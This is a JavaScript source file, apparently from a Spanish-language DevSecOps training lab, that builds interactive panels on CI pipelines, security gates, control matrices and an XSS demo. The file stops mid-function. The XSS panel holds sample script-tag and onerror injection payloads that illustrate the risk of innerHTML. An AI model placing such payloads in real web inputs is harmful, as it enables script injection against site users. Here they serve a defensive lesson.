/**
 * src/interactive/builders.js
 * Interactive lab component builders extracted from main.js.
 * Each builder takes (container, lab, onInteraction) and mounts vanilla JS
 * DOM into the provided container element.
 *
 * onInteraction(key) — called when the required interaction is completed.
 */

import { renderIcon } from './icons.js';
import { SCENARIOS, STAGE_DEFINITIONS, runPipelineScenario } from '../pipeline.js';
import { CONTROL_MATRIX, getBlastRadius } from '../controls.js';
import {
  THREAT_SCENARIOS,
  evaluateThreatChallenge,
} from '../challenges.js';
import { generateGreeting } from '../app.js';
import { recordThreatResult } from '../lab-engine.js';

// ── Utilities ─────────────────────────────────────────────────────────
function escHtml(str) {
  return String(str ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// ── Dispatch ──────────────────────────────────────────────────────────
export function mountInteractive(container, lab, onInteraction) {
  switch (lab.interactiveKey) {
    case 'pipeline':          buildPipeline(container, lab, onInteraction);          break;
    case 'scanner-gate':      buildScannerGate(container, onInteraction);            break;
    case 'controls':          buildControls(container, lab, onInteraction);          break;
    case 'blast-radius':      buildBlastRadius(container, onInteraction);            break;
    case 'threat-challenge':  buildThreatChallenge(container, lab, onInteraction);   break;
    case 'xss-demo':          buildXssDemo(container, onInteraction);                break;
    case 'architecture':      buildArchitecture(container, onInteraction);           break;
    case 'matrix':            buildMatrix(container, onInteraction);                 break;
    case 'incident-timeline': buildIncidentTimeline(container, onInteraction);       break;
  }
}

// ── Pipeline ──────────────────────────────────────────────────────────
function buildPipeline(container, lab, onInteraction) {
  const scenarioKey = lab.scenarioToRun;
  const requiredScenario = SCENARIOS[scenarioKey];

  const scenarioOpts = Object.entries(SCENARIOS).map(([key, s]) =>
    `<option value="${key}" ${key === scenarioKey ? 'selected' : ''}>${escHtml(s.name)}</option>`
  ).join('');

  const stagesHtml = STAGE_DEFINITIONS.map((s, i) => {
    const isLast = i === STAGE_DEFINITIONS.length - 1;
    return `
      <div class="tl-stage waiting" id="stage-${s.id}">
        <div class="tl-node-wrap">
          <div class="tl-node">${renderIcon(s.icon)}</div>
          <div class="tl-pulse"></div>
        </div>
        <div class="tl-name">${s.label}</div>
        <div class="tl-status">ESPERA</div>
      </div>
      ${!isLast ? `<div class="tl-conn"><div class="tl-conn-line"></div><div class="tl-conn-arrow"></div></div>` : ''}
    `;
  }).join('');

  container.innerHTML = `
    <div class="pipeline-panel">
      <div class="tl-controls">
        <div class="tl-hint">
          Escenario requerido: <strong>${escHtml(requiredScenario.name)}</strong>
        </div>
        <div class="tl-controls-row">
          <label class="sr-only" for="scenario-select">Escenario del pipeline</label>
          <select id="scenario-select" class="tl-select">${scenarioOpts}</select>
          <button class="tl-run-btn" id="run-pipeline-btn">
            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" style="flex-shrink:0">
              <path d="M2.5 2l7 4-7 4V2z" fill="currentColor"/>
            </svg>
            Ejecutar Pipeline
          </button>
        </div>
      </div>
      <div class="tl-track" id="pipeline-stages" tabindex="0" role="region" aria-label="Etapas del pipeline">${stagesHtml}</div>
      <div class="tl-terminal" id="pipeline-log" hidden>
        <div class="term-bar">
          <span class="term-icon">${renderIcon("terminal")}</span>
          <span class="term-title">GitHub Actions Runner — pipeline.yml</span>
        </div>
        <div class="term-body" id="log-body" tabindex="0" role="region" aria-label="Registro del pipeline"><span class="tll-prompt">Microsoft Windows [GitHub Actions Runner v2]</span><span class="tll-prompt">(c) GitHub, Inc. Todos los derechos reservados.</span><span class="tll-prompt">&nbsp;</span></div>
      </div>
      <div class="pipeline-insight" id="pipeline-insight" hidden></div>
    </div>
  `;

  let running = false;
  container.querySelector('#run-pipeline-btn').onclick = () => {
    if (running) return;
    running = true;
    const btn = container.querySelector('#run-pipeline-btn');
    btn.disabled = true;
    const sel = container.querySelector('#scenario-select').value;
    const result = runPipelineScenario(sel);
    if (!result) { running = false; btn.disabled = false; return; }
    animatePipeline(container, result, () => {
      running = false;
      btn.disabled = false;
      const req = lab.requiredInteractions[0];
      if (sel === 'healthy' && req === 'pipeline-run-healthy')                          onInteraction('pipeline-run-healthy');
      else if (sel === 'vulnerable-dependency' && req === 'pipeline-run-vulnerable-dep') onInteraction('pipeline-run-vulnerable-dep');
      else if (sel === 'secret-detected' && req === 'pipeline-run-secret-detected')     onInteraction('pipeline-run-secret-detected');
    });
  };
}

function logLineClass(line) {
  if (line.startsWith('[RUNNER]'))  return 'tll-runner';
  if (line.startsWith('[SCA]'))     return 'tll-sca';
  if (line.startsWith('[SECRET]') || line.startsWith('[PUSH'))  return 'tll-secret';
  if (line.startsWith('[SAST]'))    return 'tll-sast';
  if (line.startsWith('[DEPLOY]'))  return 'tll-deploy';
  if (line.startsWith('[MERGE]'))   return 'tll-merge';
  if (line.startsWith('[REVIEW]'))  return 'tll-review';
  if (line.includes('BLOQUEADO') || line.includes('error code') || line.includes('code 1') || line.includes('rejected')) return 'tll-error';
  if (line.includes('✓') || line.includes('satisf') || line.includes('permitido') || line.includes('preparado')) return 'tll-ok';
  return 'tll-default';
}

function animatePipeline(container, scenario, onComplete) {
  const logEl = container.querySelector('#pipeline-log');
  const logBody = container.querySelector('#log-body');
  const insightEl = container.querySelector('#pipeline-insight');
  logEl.hidden = false;
  logBody.innerHTML = '<span class="tll-prompt">PS C:\\actions\\runner&gt; Ejecutando pipeline.yml</span><span class="tll-prompt">&nbsp;</span>';
  insightEl.hidden = true;

  STAGE_DEFINITIONS.forEach(s => {
    const el = container.querySelector(`#stage-${s.id}`);
    if (el) { el.className = 'tl-stage waiting'; el.querySelector('.tl-status').textContent = 'ESPERA'; }
  });
  container.querySelectorAll('.tl-conn').forEach(c => c.classList.remove('active'));

  let stageIdx = 0;
  function nextStage() {
    if (stageIdx >= STAGE_DEFINITIONS.length) {
      if (scenario.insight) {
        insightEl.hidden = false;
        insightEl.innerHTML = `<div class="insight-box"><strong>Conclusión:</strong> ${escHtml(scenario.insight)}</div>`;
      }
      if (scenario.finding) showFinding(container, scenario.finding);
      onComplete();
      return;
    }
    const stageDef = STAGE_DEFINITIONS[stageIdx];
    const stageData = scenario.stages[stageDef.id];
    const el = container.querySelector(`#stage-${stageDef.id}`);
    if (el) { el.className = 'tl-stage running'; el.querySelector('.tl-status').textContent = 'EN CURSO'; }

    setTimeout(() => {
      if (el) {
        const r = stageData.result;
        el.className = `tl-stage ${r.toLowerCase()}`;
        el.querySelector('.tl-status').textContent = r === 'PASSED' ? 'PASÓ' : r === 'FAILED' ? 'FALLÓ' : 'BLOQUEADO';
        if (r === 'PASSED') {
          const conns = container.querySelectorAll('.tl-conn');
          if (conns[stageIdx]) conns[stageIdx].classList.add('active');
        }
      }
      const stageLogs = scenario.logs.filter(l => {
        const prefix = stageDef.id === 'calidad' ? '[QUALITY]' :
          stageDef.id === 'pruebas' ? '[TEST]' :
          stageDef.id === 'sca' ? '[SCA]' :
          stageDef.id === 'sast' ? '[SAST]' :
          stageDef.id === 'revision' ? '[REVIEW]' :
          stageDef.id === 'merge' ? '[MERGE]' :
          stageDef.id === 'deploy' ? '[DEPLOY]' :
          stageDef.id === 'evento' ? '[EVENT]' : '';
        return l.startsWith(prefix) || l.startsWith('[RUNNER]');
      });
      stageLogs.slice(0, 2).forEach(line => {
        const el2 = document.createElement('div');
        el2.className = logLineClass(line);
        el2.classList.add('hsw-log-line');
        el2.textContent = line;
        logBody.appendChild(el2);
        logBody.scrollTop = logBody.scrollHeight;
      });
      stageIdx++;
      setTimeout(nextStage, 420);
    }, 620);
  }
  nextStage();
}

function showFinding(container, finding) {
  const insEl = container.querySelector('#pipeline-insight');
  if (!insEl) return;
  insEl.innerHTML += buildFindingEvidence(finding);
}

function buildFindingEvidence(finding) {
  const ctrl = finding.control || '';
  const sev = (finding.severity || 'HIGH').toLowerCase();

  if (ctrl.includes('npm audit') || ctrl.includes('SCA')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">npm audit · Software Composition Analysis</span>
          <span class="evidence-sev sev-${sev}">${finding.severity}</span>
        </div>
        <pre class="evidence-terminal evidence-fail">$ npm audit --audit-level=high

# npm audit report

${escHtml(finding.package || 'vulnerable-package')}  &lt;1.1.0
Severity:     <span class="hl-red">high</span>
Title:        ${escHtml(finding.title)}
CVE:          ${escHtml(finding.cve || 'CVE-DEMO-2024-0001')}
Description:  ${escHtml(finding.message || '')}
Patched in:   >=1.1.0
Fix:          npm audit fix

<span class="hl-red">1 high severity vulnerability</span>

npm error code EAUDITLEVEL
<span class="hl-red">Process exited with code 1</span></pre>
        <div class="evidence-meta">
          <span>Política: <code>--audit-level=high → FAIL si HIGH o CRITICAL</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  if (ctrl.includes('CodeQL') || ctrl.includes('SAST')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">GitHub Code Scanning · CodeQL</span>
          <span class="evidence-sev sev-${sev}">${finding.rule || 'js/xss'} · ${finding.severity}</span>
        </div>
        <div class="evidence-codeql">
          <div class="codeql-rule">
            <span class="codeql-badge">Rule</span> ${escHtml(finding.rule || 'js/xss')}
            &nbsp;&nbsp;<span class="codeql-badge">Severity</span> Error (High)
          </div>
          <div class="codeql-title">${escHtml(finding.title)}</div>
          <div class="codeql-flow">
            <div class="flow-step flow-source"><span class="flow-label">Source</span><code>${escHtml(finding.source || 'Entrada controlada por el usuario')}</code></div>
            <div class="flow-arrow">↓ taint flows through template literal</div>
            <div class="flow-step flow-sink"><span class="flow-label">Sink</span><code>${escHtml(finding.sink || 'innerHTML')}</code></div>
          </div>
        </div>
        <div class="evidence-meta">
          <span>Política: <code>${escHtml(finding.policy || '')}</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  if (ctrl.includes('Secret') || ctrl.includes('Push Protection')) {
    return `
      <div class="evidence-panel">
        <div class="evidence-header">
          <span class="evidence-tool">git push · GitHub Push Protection</span>
          <span class="evidence-sev sev-critical">CRITICAL</span>
        </div>
        <pre class="evidence-terminal evidence-fail">$ git push origin feature/config

remote: <span class="hl-red">error: GH013: Repository rule violations found.</span>
remote: <span class="hl-red">- GITHUB PUSH PROTECTION</span>
remote:   (?) GitHub Personal Access Token found in commit
remote:       <span class="hl-yellow">${escHtml(finding.file || 'config/settings.js')}, line ${finding.line || 3}</span>
remote:
To https://github.com/neavus-23/Helllo-Secure-World.git
<span class="hl-red"> ! [remote rejected] (push declined due to repository rule violations)</span></pre>
        <div class="evidence-meta">
          <span>Política: <code>Secreto detectado → push rechazado</code></span>
          <span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span>
          <span class="evidence-residual">⚠️ Riesgo residual: ${escHtml(finding.residualRisk || '')}</span>
        </div>
      </div>`;
  }

  return `
    <div class="evidence-panel">
      <div class="evidence-header">
        <span class="evidence-tool">${escHtml(ctrl)}</span>
        <span class="evidence-sev sev-${sev}">${finding.severity}</span>
      </div>
      <div class="evidence-generic"><strong>${escHtml(finding.title)}</strong><p>${escHtml(finding.message || '')}</p></div>
      <div class="evidence-meta"><span>Decisión: <code class="hl-red">${escHtml(finding.decision)}</code></span></div>
    </div>`;
}

// ── Scanner-Gate ──────────────────────────────────────────────────────
function buildScannerGate(container, onInteraction) {
  const steps = [
    { icon: '🔍', label: 'Scanner ejecuta', desc: 'npm audit analiza el árbol de dependencias.' },
    { icon: '📋', label: 'Genera hallazgo', desc: 'Encuentra lodash@4.17.4 — CVE-2020-8203, severidad HIGH.' },
    { icon: '📏', label: 'Política evalúa', desc: 'Regla: "HIGH o CRITICAL → FAIL". El hallazgo supera el umbral.' },
    { icon: '🚦', label: 'Decisión: BLOCK', desc: 'El job falla con exit code ≠ 0.' },
    { icon: '✅', label: 'Required Check', desc: 'El status check "security" aparece como FAILED en GitHub.' },
    { icon: '🔒', label: 'Merge bloqueado', desc: 'Branch Protection requiere el check — el PR no puede mergearse.' },
  ];

  const stepsHtml = steps.map((s, i) => `
    <div class="gate-step" id="gate-step-${i}">
      <div class="gate-step-icon">${renderIcon(s.icon)}</div>
      <div class="gate-step-body"><strong>${s.label}</strong><p>${s.desc}</p></div>
    </div>
  `).join('<div class="gate-arrow">↓</div>');

  container.innerHTML = `
    <div class="scanner-gate-panel">
      <div class="gate-callout">
        <strong>Scanner ≠ Security Gate.</strong>
        Un scanner detecta. Un Security Gate usa esa detección para controlar el merge.
      </div>
      <div class="gate-toolbar">
        <button class="btn btn-primary" id="animate-gate-btn">▶ Animar el flujo</button>
        <p class="gate-progress" id="gate-progress" role="status">6 pasos listos para explorar.</p>
      </div>
      <div class="gate-steps" id="gate-steps">${stepsHtml}</div>
    </div>
  `;

  let animated = false;
  container.querySelector('#animate-gate-btn').onclick = () => {
    if (animated) return;
    animated = true;
    container.querySelector('#animate-gate-btn').disabled = true;
    animateGateSteps(container, steps, () => {
      container.querySelector('#gate-progress').textContent = 'Flujo completado: 6 de 6 pasos.';
      container.querySelector('#animate-gate-btn').textContent = '✓ Flujo completado';
      onInteraction('gate-animation-complete');
      const panel = container.querySelector('.scanner-gate-panel');
      if (panel) {
        const ev = document.createElement('div');
        ev.innerHTML = `
          <div class="evidence-panel" style="margin-top:1.5rem">
            <div class="evidence-header">
              <span class="evidence-tool">npm audit · Lo que el desarrollador vio en CI</span>
              <span class="evidence-sev sev-high">HIGH</span>
            </div>
            <pre class="evidence-terminal evidence-fail">$ npm audit --audit-level=high

lodash  &lt;4.17.21
Severity:     <span class="hl-red">high</span>
CVE:          CVE-2020-8203
Fix:          npm audit fix

<span class="hl-red">1 high severity vulnerability</span>
<span class="hl-red">Process exited with code 1</span>

#  El scanner DETECTÓ y REPORTÓ la vulnerabilidad
# 🚦  La política HIGH=FAIL generó una decisión de BLOCK
# ✅  El status check "security" aparece como FAILED en GitHub
# 🔒  Branch Protection requiere "security" → merge BLOQUEADO</pre>
            <div class="evidence-meta">
              <span>Sin Branch Protection → el scanner detecta, pero nadie impide el merge</span>
              <span>Con Branch Protection → el required check convierte el scanner en <code>Security Gate</code></span>
            </div>
          </div>`;
        panel.appendChild(ev);
      }
    });
  };
}

function animateGateSteps(container, steps, onComplete) {
  let i = 0;
  function next() {
    if (!container.isConnected || !container.querySelector('#gate-steps')) return;
    if (i >= steps.length) { onComplete(); return; }
    const el = container.querySelector(`#gate-step-${i}`);
    if (el) { el.classList.add('is-revealed'); }
    container.querySelector('#gate-progress').textContent = `Paso ${i + 1} de ${steps.length}: ${steps[i].label}.`;
    i++;
    setTimeout(next, 700);
  }
  next();
}

// ── Controls Explorer ─────────────────────────────────────────────────
const CTRL_ICONS = {
  eslint: '🔍', tests: '✅', sca: '📦', sast: '🔬',
  'secret-scanning': '🔐', 'code-review': '👁️',
  'branch-protection': '🌿', 'least-privilege': '🔒',
  dependabot: '🤖', deploy: '🚀',
};

function renderDecision(dec) {
  const GREEN = ['PASS', 'ALLOW', 'APROBAR', 'DEPLOY', 'PR'];
  const RED   = ['FAIL', 'BLOCK', 'RECHAZAR'];
  const parts = dec.split('/').map(s => s.trim());
  if (parts.length === 2) {
    const [a, b] = parts;
    const ac = GREEN.includes(a) ? 'dec-g' : RED.includes(a) ? 'dec-r' : 'dec-y';
    const bc = RED.includes(b)   ? 'dec-r' : GREEN.includes(b) ? 'dec-g' : 'dec-y';
    return `<span class="${ac}">${a}</span><span class="dec-sep"> / </span><span class="${bc}">${b}</span>`;
  }
  return `<span class="dec-y">${escHtml(dec)}</span>`;
}

function buildControls(container, lab, onInteraction) {
  const targetCtrl = lab.targetControl ? CONTROL_MATRIX.find(c => c.id === lab.targetControl) : null;

  const cards = CONTROL_MATRIX.map(c => {
    const isTarget = c.id === lab.targetControl;
    const icon = CTRL_ICONS[c.id] || '⚙️';
    return `
      <div class="cc2${isTarget ? ' cc2-target' : ''}" data-id="${c.id}" tabindex="0" role="button" aria-pressed="false" aria-label="Ver control ${escHtml(c.name)}">
        <div class="cc2-top cat-${c.controlType}"></div>
        <div class="cc2-inner">
          <div class="cc2-row1">
            <span class="cc2-icon">${renderIcon(icon)}</span>
            <span class="cc2-badge cat-${c.controlType}">${escHtml(c.category)}</span>
          </div>
          <div class="cc2-name">${escHtml(c.name)}</div>
          <div class="cc2-dec">${renderDecision(c.decision)}</div>
          ${isTarget ? '<div class="cc2-target-hint">→ Abrir</div>' : ''}
        </div>
      </div>`;
  }).join('');

  const hint = targetCtrl ? `
    <div class="cc2-hint">
      <span class="cc2-hint-icon">${renderIcon("clipboard")}</span>
      <span>Abre el control <strong>${escHtml(targetCtrl.name)}</strong> para ver su modelo completo.</span>
      <span class="cc2-hint-arr">→</span>
    </div>` : '';

  container.innerHTML = `
    <div class="controls-panel">
      ${hint}
      <div class="cc2-grid">${cards}</div>
      <div id="control-detail-inline" hidden></div>
    </div>`;

  container.querySelectorAll('.cc2').forEach(card => {
    const open = () => {
      const id = card.dataset.id;
      const ctrl = CONTROL_MATRIX.find(c => c.id === id);
      if (!ctrl) return;
      container.querySelectorAll('.cc2').forEach(c => { c.classList.remove('cc2-active'); c.setAttribute('aria-pressed', 'false'); });
      card.classList.add('cc2-active');
      card.setAttribute('aria-pressed', 'true');
      showControlDetail(container, ctrl);
      if (id === lab.targetControl) onInteraction('control-sca-opened');
    };
    card.addEventListener('click', open);
    card.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); open(); } });
  });
}

function showControlDetail(container, ctrl) {
  const el = container.querySelector('#control-detail-inline');
  if (!el) return;
  el.hidden = false;
  el.innerHTML = `
    <div class="cdet">
      <div class="cdet-header">
        <span class="cdet-icon">${renderIcon(CTRL_ICONS[ctrl.id] || '⚙️')}</span>
        <div class="cdet-titles">
          <span class="cdet-name">${escHtml(ctrl.name)}</span>
          <span class="cc2-badge cat-${ctrl.controlType}">${escHtml(ctrl.category)}</span>
        </div>
        <div class="cdet-dec">${renderDecision(ctrl.decision)}</div>
      </div>
      <div class="cdet-grid">
        <div class="cdet-item">
          <div class="cdet-label">Amenaza que mitiga</div>
          <div class="cdet-val">${escHtml(ctrl.threat)}</div>
        </div>
        <div class="cdet-item">
          <div class="cdet-label">Técnica</div>
          <div class="cdet-val">${escHtml(ctrl.technique)}</div>
        </div>
        <div class="cdet-item cdet-full">
          <div class="cdet-label">Política de enforcement</div>
          <code class="cdet-code">${escHtml(ctrl.policy)}</code>
        </div>
        <div class="cdet-item">
          <div class="cdet-label">✓ Fortaleza</div>
          <div class="cdet-val cdet-green">${escHtml(ctrl.strength)}</div>
        </div>
        <div class="cdet-item">
          <div class="cdet-label">⚠ Limitación</div>
          <div class="cdet-val cdet-yellow">${escHtml(ctrl.limitation)}</div>
        </div>
        <div class="cdet-item cdet-full">
          <div class="cdet-label">Riesgo residual</div>
          <div class="cdet-val cdet-red">${escHtml(ctrl.residualRisk)}</div>
        </div>
      </div>
    </div>`;
  el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// ── Blast Radius ──────────────────────────────────────────────────────
function buildBlastRadius(container, onInteraction) {
  container.innerHTML = `
    <div class="blast-panel">
      <div class="blast-toggle-row">
        <button class="blast-btn active" id="btn-least" aria-pressed="true">Least Privilege</button>
        <button class="blast-btn" id="btn-excess" aria-pressed="false">Permisos Excesivos</button>
      </div>
      <div id="blast-display"></div>
    </div>
  `;
  renderBlastMode(container, 'least');
  container.querySelector('#btn-least').onclick = () => {
    container.querySelector('#btn-least').classList.add('active');
    container.querySelector('#btn-least').setAttribute('aria-pressed', 'true');
    container.querySelector('#btn-excess').classList.remove('active');
    container.querySelector('#btn-excess').setAttribute('aria-pressed', 'false');
    renderBlastMode(container, 'least');
  };
  container.querySelector('#btn-excess').onclick = () => {
    container.querySelector('#btn-excess').classList.add('active');
    container.querySelector('#btn-excess').setAttribute('aria-pressed', 'true');
    container.querySelector('#btn-least').classList.remove('active');
    container.querySelector('#btn-least').setAttribute('aria-pressed', 'false');
    renderBlastMode(container, 'excessive');
    onInteraction('blast-toggled-excessive');
  };
}

function renderBlastMode(container, mode) {
  const data = getBlastRadius(mode === 'least' ? 'least-privilege' : 'write-all');
  if (!data) return;
  const el = container.querySelector('#blast-display');
  el.innerHTML = `
    <div class="blast-card sev-${data.severity?.toLowerCase() || 'low'}">
      <div class="blast-header">
        <span class="blast-label">${data.label}</span>
        <span class="blast-sev">${data.severity || ''}</span>
      </div>
      <div class="blast-perms">
        <label>Permisos del GITHUB_TOKEN:</label>
        <code>${escHtml(data.permissionsDisplay || '')}</code>
      </div>
      <div class="blast-impact">
        <label>Impacto si la Action es comprometida:</label>
        <ul>${(data.impact || []).map(i => `<li>${escHtml(i)}</li>`).join('')}</ul>
      </div>
      <p class="blast-desc">${escHtml(data.description || '')}</p>
    </div>
  `;
}

// ── Threat Challenge ──────────────────────────────────────────────────
function buildThreatChallenge(container, lab, onInteraction) {
  const threats = lab.threatIds.map(id => THREAT_SCENARIOS.find(s => s.id === id)).filter(Boolean);

  const threatsHtml = threats.map(threat => `
    <div class="threat-card" data-threat="${threat.id}">
      <div class="threat-header">
        <span class="threat-tag">AMENAZA</span>
        <strong>${escHtml(threat.threat)}</strong>
      </div>
      <p class="threat-desc">${escHtml(threat.description)}</p>
      <div class="threat-controls-select">
        <label>¿Qué controles mitigan mejor esta amenaza?</label>
        <div class="control-options">
          ${['eslint','tests','sca','sast','secret-scanning','code-review','branch-protection','least-privilege','dependabot'].map(cid => {
            const ctrl = CONTROL_MATRIX.find(c => c.id === cid);
            return ctrl ? `<label class="control-check"><input type="checkbox" value="${cid}" data-threat="${threat.id}"> ${ctrl.name}</label>` : '';
          }).join('')}
        </div>
        <button class="btn btn-sm threat-submit-btn" data-threat="${threat.id}">Evaluar →</button>
      </div>
      <div class="threat-result" id="threat-result-${threat.id}" hidden></div>
    </div>
  `).join('');

  container.innerHTML = `<div class="threat-challenge-panel">${threatsHtml}</div>`;

  container.querySelectorAll('.threat-submit-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const threatId = btn.dataset.threat;
      const checked = Array.from(
        container.querySelectorAll(`input[type=checkbox][data-threat="${threatId}"]:checked`)
      ).map(el => el.value);

      const result = evaluateThreatChallenge(threatId, checked);
      if (!result) return;

      recordThreatResult(threatId, result.primaryHit);
      showThreatResult(container, threatId, result);
      btn.disabled = true;
      container.querySelectorAll(`input[data-threat="${threatId}"]`).forEach(el => el.disabled = true);

      if (threatId === 'vulnerable-npm')       onInteraction('threat-vuln-npm');
      if (threatId === 'compromised-action')   onInteraction('threat-compromised-action');
    });
  });
}

function showThreatResult(container, threatId, result) {
  const el = container.querySelector(`#threat-result-${threatId}`);
  if (!el) return;
  el.hidden = false;
  el.innerHTML = `
    <div class="threat-eval ${result.primaryHit ? 'eval-correct' : 'eval-incorrect'}">
      <strong>${result.primaryHit ? '✓' : '✗'} Control primario: ${result.primaryControls.join(', ')}</strong>
      <p>${escHtml(result.explanation)}</p>
      <p class="limitation">⚠️ Limitación: ${escHtml(result.limitations)}</p>
      ${result.complementaryControls.length ? `<p>Controles complementarios: ${result.complementaryControls.join(', ')}</p>` : ''}
    </div>
  `;
}

// ── XSS Demo ──────────────────────────────────────────────────────────
function buildXssDemo(container, onInteraction) {
  container.innerHTML = `
    <div class="xss-panel">
      <div class="xss-code-strip">
        <div class="code-compare">
          <div class="code-block code-bad"><div class="code-label">✗ Inseguro</div><code>el.innerHTML = name;</code></div>
          <div class="code-block code-good"><div class="code-label">✓ Seguro</div><code>el.textContent = name;</code></div>
        </div>
      </div>
      <div class="xss-demo-area">
        <label for="xss-input">Tu nombre</label>
        <input type="text" id="xss-input" class="xss-input" placeholder="Escribe un texto para probar" />
        <div class="xss-btns">
          <button class="btn btn-primary" id="gen-greeting-btn">Generar saludo</button>
          <button class="btn btn-warn" id="try-xss-btn">Probar XSS</button>
        </div>
        <div class="xss-output" id="xss-output" hidden>
          <label>Saludo generado (textContent):</label>
          <div class="greeting-display" id="greeting-display"></div>
          <div class="xss-status" id="xss-status"></div>
        </div>
      </div>
    </div>
  `;

  container.querySelector('#gen-greeting-btn').onclick = () => {
    const val = container.querySelector('#xss-input').value;
    const greeting = generateGreeting(val);
    const out = container.querySelector('#xss-output');
    const disp = container.querySelector('#greeting-display');
    const status = container.querySelector('#xss-status');
    out.hidden = false;
    disp.textContent = greeting;
    status.innerHTML = '✓ Input tratado como texto puro &nbsp; ✓ textContent usado &nbsp; ✓ HTML no interpretado';
  };

  container.querySelector('#try-xss-btn').onclick = () => {
    container.querySelector('#xss-input').value = '<script>alert("XSS")</scr' + 'ipt>';
    const val = container.querySelector('#xss-input').value;
    const greeting = generateGreeting(val);
    const out = container.querySelector('#xss-output');
    const disp = container.querySelector('#greeting-display');
    const status = container.querySelector('#xss-status');
    out.hidden = false;
    disp.textContent = greeting;
    status.innerHTML = '✓ &lt;script&gt; mostrado como texto literal — no ejecutado';
    onInteraction('xss-btn-clicked');

    if (!container.querySelector('#xss-codeql-evidence')) {
      const xssPanel = container.querySelector('.xss-panel');
      if (xssPanel) {
        const ev = document.createElement('div');
        ev.id = 'xss-codeql-evidence';
        ev.innerHTML = `
          <div class="evidence-panel" style="margin-top:1.5rem">
            <div class="evidence-header">
              <span class="evidence-tool">GitHub Code Scanning · CodeQL — Lo que el equipo ve cuando usa innerHTML</span>
              <span class="evidence-sev sev-high">js/xss · HIGH</span>
            </div>
            <div class="evidence-codeql">
              <div class="codeql-rule">
                <span class="codeql-badge">Rule</span> js/xss
                &nbsp;&nbsp;<span class="codeql-badge">Severity</span> Error (High)
              </div>
              <div class="codeql-title">DOM text set from location-provided value</div>
              <div class="codeql-flow">
                <div class="flow-step flow-source"><span class="flow-label">Source</span><code>URLSearchParams.get('name') → src/app.js:3</code></div>
                <div class="flow-arrow">↓ taint flows through generateGreeting()</div>
                <div class="flow-step flow-sink"><span class="flow-label">Sink</span><code>el.innerHTML = greeting → src/app.js:8</code></div>
              </div>
              <p class="codeql-desc">
                Si este código usara <code>innerHTML</code>, cualquier input con HTML como
                <code>&lt;img src=x onerror=alert(1)&gt;</code> se ejecutaría en el navegador.
                <strong>textContent</strong> elimina esta clase de ataque porque el contenido nunca se parsea como HTML.
              </p>
            </div>
          </div>`;
        xssPanel.appendChild(ev);
      }
    }
  };
}

// ── Architecture ──────────────────────────────────────────────────────
const ARCH_ZONES = {
  dev: { label: 'Entorno del Desarrollador', assets: 'Código fuente, credenciales locales, configuración del IDE', threats: 'Malware en la máquina, credenciales comprometidas, commits accidentales de secretos', controls: 'Secret Scanning (Push Protection), code review, 2FA en cuenta GitHub', icon: '💻' },
  github: { label: 'Plataforma GitHub (Repo + PR)', assets: 'Historial de commits, secretos del repositorio, configuración de Branch Protection', threats: 'Cuenta comprometida, PR malicioso, bypass de Branch Protection por admin', controls: 'Branch Protection, Required Status Checks, Code Review, 2FA', icon: '☁️' },
  runner: { label: 'GitHub Actions Runner', assets: 'GITHUB_TOKEN, secretos del workflow, código ejecutado de Actions de terceros', threats: 'Action de terceros comprometida, escalada de permisos vía workflow modificado', controls: 'Least Privilege (permissions), SHA pinning, usar solo Actions de publishers confiables', icon: '⚙️' },
  deploy: { label: 'Entorno de Despliegue (GitHub Pages)', assets: 'Artefacto publicado, configuración de despliegue', threats: 'Artefacto malicioso publicado si el pipeline es comprometido', controls: 'OIDC (id-token: write), deploy desde main solamente, artefacto firmado', icon: '🌐' },
};

function buildArchitecture(container, onInteraction) {
  const zonesHtml = Object.entries(ARCH_ZONES).map(([id, zone]) => `
    <div class="arch-zone" data-zone="${id}" tabindex="0" role="button" aria-pressed="false" aria-label="Explorar zona ${zone.label}">
      <div class="arch-zone-icon">${renderIcon(zone.icon)}</div>
      <div class="arch-zone-label">${zone.label}</div>
    </div>
  `).join('<div class="arch-arrow">→</div>');

  container.innerHTML = `
    <div class="arch-panel">
      <p class="arch-hint">Haz clic en cada zona para ver sus activos, amenazas y controles.</p>
      <div class="arch-zones">${zonesHtml}</div>
      <div class="arch-detail" id="arch-detail" hidden></div>
    </div>
  `;

  container.querySelectorAll('.arch-zone').forEach(el => {
    const open = () => {
      const zoneId = el.dataset.zone;
      const zone = ARCH_ZONES[zoneId];
      container.querySelectorAll('.arch-zone').forEach(z => { z.classList.remove('active'); z.setAttribute('aria-pressed', 'false'); });
      el.classList.add('active');
      el.setAttribute('aria-pressed', 'true');
      const detail = container.querySelector('#arch-detail');
      detail.hidden = false;
      detail.innerHTML = `
        <div class="arch-zone-detail">
          <h3>${renderIcon(zone.icon)} ${zone.label}</h3>
          <div class="arch-detail-grid">
            <div><label>Activos</label><p>${escHtml(zone.assets)}</p></div>
            <div><label>Amenazas</label><p class="text-fail">${escHtml(zone.threats)}</p></div>
            <div><label>Controles</label><p class="text-pass">${escHtml(zone.controls)}</p></div>
          </div>
        </div>
      `;
      onInteraction(`arch-zone-${zoneId}`);
    };
    el.addEventListener('click', open);
    el.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); open(); } });
  });
}

// ── Control Matrix ────────────────────────────────────────────────────
function buildMatrix(container, onInteraction) {
  const categories = ['Todos', 'Calidad', 'Pruebas', 'SCA', 'SAST', 'Secretos', 'Gobernanza', 'Acceso'];
  const catMap = { 'Calidad': 'Calidad', 'Pruebas': 'Pruebas', 'SCA': 'SCA', 'SAST': 'SAST', 'Secretos': 'Secretos', 'Gobernanza': 'Gobernanza', 'Acceso': 'Control de Acceso' };
  let filtered = false;

  const filtersHtml = categories.map(cat =>
